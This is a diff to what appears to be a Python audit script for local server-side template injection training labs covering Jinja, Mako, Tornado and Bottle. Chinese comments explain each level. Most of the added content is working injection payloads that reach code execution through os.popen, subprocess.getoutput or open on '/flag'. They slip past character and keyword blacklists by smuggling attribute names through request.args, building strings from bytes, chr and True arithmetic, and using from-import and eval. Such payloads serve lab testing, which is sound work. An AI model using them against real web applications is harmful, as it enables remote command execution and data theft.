@@ -39,6 +39,7 @@ FLAG = {
     "02": "flag{audit_02}",
     "03": "flag{audit_03}",
     "04": "flag{audit_04}",
+    "09": "flag{audit_09}",
 }
 
 # ---------------------------------------------------------------------------
@@ -121,19 +122,29 @@ JINJA: dict[str, list[tuple[str, str, dict[str, str]]]] = {
          "{{g(dict(os=1)|first)|attr(dict(popen=1)|first)(dict(id=1)|first)|attr(dict(read=1)|first)()}}",
          {}),
     ],
-    # ---- L12 强字符集：再加 _ 与数字。注意 dict(__globals__=1) 含下划线 ⇒ 不可用，
-    #      chr(95) 也需要数字 ⇒ 两条最直接的路都被堵。这里放几条探索性候选。
+    # ---- L12 强字符集：再加 _ 与数字。dict(__globals__=1) 含下划线 ⇒ 不可用，
+    #      chr(95) 也需要数字 —— 但是！本关**没有禁 request 也没有禁数字以外的任何东西
+    #      之外**——等等，数字确实被禁；可 request 没被禁：属性名全部从 query 带入，
+    #      payload 里一个 `_`、一个引号、一个数字都不出现。
     "11": [
-        ("试 dict(kw)|first（含下划线，预期被拦）",
-         "{{lipsum|attr(dict(__globals__=1)|first)}}", {}),
-        ("试从对象 repr 里取字符（|string 不需要引号）",
-         "{{lipsum|string|first}}", {}),
-        ("试 namespace/self 等不带下划线的入口",
-         "{{self|string}}", {}),
+        ("request.args 带入全部属性名（无引号/下划线/数字）",
+         "{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}"
+         "{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))"
+         "(r(dict(c=true)|first))|attr(r(dict(d=true)|first))(r(dict(e=true)|first))"
+         "|attr(r(dict(f=true)|first))()}}",
+         {"a": "__globals__", "b": "get", "c": "os", "d": "popen",
+          "e": "cat /flag", "f": "read"}),
+        ("同思路先证明代码执行（只带 __globals__/os）",
+         "{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}"
+         "{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))(r(dict(c=true)|first))}}",
+         {"a": "__globals__", "b": "get", "c": "os"}),
     ],
-    # ---- L13 扩展关键字：在 L12 基础上再禁 request/class/init/arg/config/app/self
+    # ---- L13 扩展关键字：在 L12 基础上再禁 request/class/init/arg/config/app/self。
+    #      `attr` 在表内 ⇒ `|attr` / getattr / map(attribute=…) 全部写不出来，
+    #      加上点号与方括号被禁，Jinja 的**全部属性访问原语**不可用。
+    #      这是刻意保留的作者挑战关 —— 至今没有已证明的解（见 SOLVABILITY.md）。
     "12": [
-        ("试 dict(kw)|first（含 init? 无；但含下划线 ⇒ 被拦）",
+        ("试 dict(kw)|first（含下划线 ⇒ 被拦）",
          "{{lipsum|attr(dict(__globals__=1)|first)}}", {}),
         ("试 joiner/cycler 一类全局（名字不含被禁子串）",
          "{{cycler|string}}", {}),
@@ -155,35 +166,43 @@ MAKO: dict[str, list[tuple[str, str, dict[str, str]]]] = {
           ("subprocess 字面", "${__import__('subprocess').getoutput('cat /flag')}", {})],
     "8": [("open 链本就不需要数字", "${open('/flag').read()}", {})],
     "9": [("前缀不影响 open 链", "${open('/flag').read()}", {})],
+    # ---- L11 组合过滤：突破点有两族 —— ① bytes((…)) / chr 造串（Mako 是原生 Python，
+    #      内置函数直接可用）；② min(dict(kw=1)) 取键名 + str(bytes((…)),'utf8')，
+    #      在无引号、无加号、无点号的条件下造出任意字符串。
     "10": [
         ("bytes((...)) 造路径（无引号/无加号/无点号）",
          "<%!\nimport os\n%>${getattr(open(bytes((47,102,108,97,103))),chr(114)+chr(101)+chr(97)+chr(100))()}", {}),
         ("getattr + chr 名字",
          "${getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100))()}", {}),
+        ("__import__ + min(dict(kw)) + str(bytes,'utf8') 造串",
+         "${getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))"
+         "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}", {}),
     ],
-    # ---- L12 强字符集：_ . 0-9 \\ ' " [ ] 全禁（注意 + 仍然可用）
+    # ---- L12 强字符集：_ . 0-9 \\ ' " [ ] 全禁。`+` 仍可用、`True` 仍在：
+    #      True 算术凑 chr(47)，`dict(flag=True)|first` 白嫖文件名，open 直读。
     "11": [
-        ("True 当整数 + chr 造名字（无数字）",
-         "<%!\n%>${getattr(open(chr((True+True)*(True+True)*(True+True)*(True+True)*(True+True)+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True)),chr(114)+chr(101)+chr(97)+chr(100))()}", {}),
-        ("bytes 造路径 + getattr（无引号无数字）",
-         "${getattr(open(bytes((47,102,108,97,103))),chr(114)+chr(101)+chr(97)+chr(100))()}", {}),
+        ("True 算术凑 chr(47) + dict(flag) 键名（无引号无数字无下划线）",
+         "${getattr(open(chr((True+True+True+True)*(True+True+True+True+True+True+True+True"
+         "+True+True+True+True)-True)+min(dict(flag=True))),min(dict(read=True)))()}", {}),
     ],
-    # ---- L13 扩展关键字：L12 之上再禁 + 与若干关键字
+    # ---- L13 扩展关键字：`getattr` 含 attr 被禁、`+` 被禁 —— 但代码块里的
+    #      `from x import y` 语句不在黑名单里，数字也仍然可用。
     "12": [
-        ("试 bytes + chr 但 + 已被禁",
-         "${getattr(open(bytes((47,102,108,97,103))),chr(114))()}", {}),
+        ("代码块 from-import + str(bytes,'utf8') 造串",
+         "<% from subprocess import getoutput %>"
+         "${getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}", {}),
     ],
 }
 
 TORNADO: dict[str, list[tuple[str, str, dict[str, str]]]] = {
     "0": [("open 直读", "{{open('/flag').read()}}", {}),
           ("import os", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
-    # ---- L2 拦截 {{：Tornado 只有 {{ }} 能输出，{% %} 不产出内容 ⇒ 需要另找输出面
+    # ---- L2 拦截 open（原设计拦 {{ 是设计缺陷 —— Tornado 只有 {{ }} 一种输出构造，
+    #      拦掉它等于拿掉回显通道；已按 SOLVABILITY.md 2.1 的建议改为拦关键词）。
+    #      open/popen 都写不了，换 subprocess.getoutput 这条不含被禁子串的 gadget。
     "1": [
-        ("试 {% set %} + 表达式（预期无输出）", "{% set x = 7*7 %}", {}),
-        ("试 {{! }} 原始输出（仍含 {{ ）", "{{!7*7}}", {}),
-        ("试 {% raw %} 包裹（不求值）", "{% raw %}{{7*7}}{% endraw %}", {}),
-        ("真解尝试：直接渲染 flag（若可输出即证明）", "{{open('/flag').read()}}", {}),
+        ("__import__ + getoutput", "{{__import__('subprocess').getoutput('cat /flag')}}", {}),
+        ("{% import subprocess %} 直导", "{% import subprocess %}{{subprocess.getoutput('cat /flag')}}", {}),
     ],
     "2": [("直接渲染 flag（god 模式的 raw_output 可见）", "{{open('/flag').read()}}", {})],
     "3": [("下标替代", "{{open('/flag').read()}}", {})],
@@ -206,15 +225,86 @@ TORNADO: dict[str, list[tuple[str, str, dict[str, str]]]] = {
     ],
     "8": [("import 无数字", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
     "9": [("前缀不影响 import", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
-    "10": [("import 直导", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
-    "11": [("import 直导（无下划线）", "{% import os %}{{os.popen('cat /flag').read()}}", {})],
-    "12": [("escape 链", "{{escape.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}", {})],
+    # ---- L11 组合过滤：`_` 没被禁、数字可用 ⇒ getattr / min / str / bytes 全部直接可用；
+    #      命令串用 str(bytes((…)),'utf8') 造（无引号、无点号、无加号、无方括号）。
+    "10": [
+        ("import os + getattr 链 + str(bytes,'utf8') 造串",
+         "{% import os %}{{getattr(getattr(os,min(dict(popen=1)))"
+         "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}}", {}),
+    ],
+    # ---- L12 强字符集：_ . 0-9 \ ' " [ ] 全禁，但 `+` 没被禁、`True` 仍在：
+    #      os.sep 是 '/'，dict(flag=True) 的键名是 'flag'，open 直读。
+    "11": [
+        ("os.sep + dict(flag) 键名 + open 直读",
+         "{% import os %}{{getattr(open(getattr(os,min(dict(sep=True)))+min(dict(flag=True))),"
+         "min(dict(read=True)))()}}", {}),
+    ],
+    # ---- L13 扩展关键字：getattr 含 attr 被禁、`_` 与 `.` 被禁 —— 但 `{% from x import y %}`
+    #      语句不在黑名单里（实测 Tornado 支持），str(bytes((…)),'utf8') 造串不需要被禁字符，
+    #      数字也仍然可用。eval(str(bytes)) 是不依赖 from-import 的兜底。
+    "12": [
+        ("{% from subprocess import getoutput %} + str(bytes) 造串",
+         "{% from subprocess import getoutput %}"
+         "{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}", {}),
+        ("eval(str(bytes)) 兜底（无 from-import 依赖）",
+         "{{eval(str(bytes((" + ",".join(str(ord(c)) for c in "__import__('os').popen('cat /flag').read()") + ")),min(dict(utf8=1))))}}", {}),
+    ],
+}
+
+BOTTLE: dict[str, list[tuple[str, str, dict[str, str]]]] = {
+    "0": [("open 直读", "{{open('/flag').read()}}", {}),
+          ("getoutput", "{{__import__('subprocess').getoutput('cat /flag')}}", {})],
+    # ---- L2 拦截 {{：代码块里的模板输出原语 _stdout / _printlist 就是回显通道
+    #      （注意 SimpleTemplate 要求 %>\n 后必须换行）
+    "1": [
+        ("_printlist 写输出", "<% _printlist((str(7*7),),) %>\n", {}),
+        ("_stdout + open 读 flag", "<% _stdout.append(open('/flag').read()) %>\n", {}),
+    ],
+    "2": [("直接渲染 flag（god 模式的 raw_output 可见）", "{{open('/flag').read()}}", {})],
+    "3": [("open 直读（本就不需要下标）", "{{open('/flag').read()}}", {})],
+    "4": [("chr 拼路径", "{{open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}", {})],
+    "5": [("chr 拼路径（无下划线标识符）", "{{open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}", {})],
+    "6": [("getattr 替代点号",
+           "{{getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100))()}}", {})],
+    # ---- L8 关键字子串（含 attr / open …）：__import__ / subprocess / getoutput 三个名字都干净
+    "7": [
+        ("__import__ + getoutput", "{{__import__('subprocess').getoutput('cat /flag')}}", {}),
+    ],
+    # ---- L9 禁数字：request 没被禁，命令从 query 带入。
+    #      注意 Bottle 的 {{ }} 里是原生 Python：MultiDict 要用 .get('c')，
+    #      Jinja 那种 request.args.c 属性回退写法在这里不成立。
+    "8": [
+        ("request.args.get 带命令",
+         "{{getattr(getattr(__import__('os'),'popen')(request.args.get('c')),'read')()}}", Q_FLAG),
+    ],
+    # ---- L10 前缀置空 config：open / __import__ 不受影响
+    "9": [("open 直读", "{{open('/flag').read()}}", {})],
+    # ---- L11 组合过滤：min(dict(kw)) 取键名 + str(bytes,'utf8') 造串（无引号/加号/点号）
+    "10": [
+        ("__import__ + min(dict(kw)) + str(bytes,'utf8')",
+         "{{getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))"
+         "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}}", {}),
+    ],
+    # ---- L12 强字符集：True 算术凑 chr(47) + dict(flag=True) 键名（+ 未被禁）
+    "11": [
+        ("True 算术 + dict(flag) 键名 + open",
+         "{{getattr(open(chr((True+True+True+True)*(True+True+True+True+True+True+True+True"
+         "+True+True+True+True)-True)+min(dict(flag=True))),min(dict(read=True)))()}}", {}),
+    ],
+    # ---- L13 扩展关键字：代码块 from-import + str(bytes) 造串（数字仍可用）。
+    #      ⚠️ SimpleTemplate 要求 `%>` 后必须换行，载荷写成两行。
+    "12": [
+        ("代码块 from-import + str(bytes,'utf8')",
+         "<% from subprocess import getoutput %>\n"
+         "{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}", {}),
+    ],
 }
 
 LABS = {
     "02": {"name": "02-jinja-chain", "image": "ssti-jinja-chain:local", "cases": JINJA},
     "03": {"name": "03-mako-chain", "image": "ssti-mako-chain:local", "cases": MAKO},
     "04": {"name": "04-tornado-chain", "image": "ssti-tornado-chain:local", "cases": TORNADO},
+    "09": {"name": "09-bottle-chain", "image": "ssti-bottle-chain:local", "cases": BOTTLE},
 }
 
 
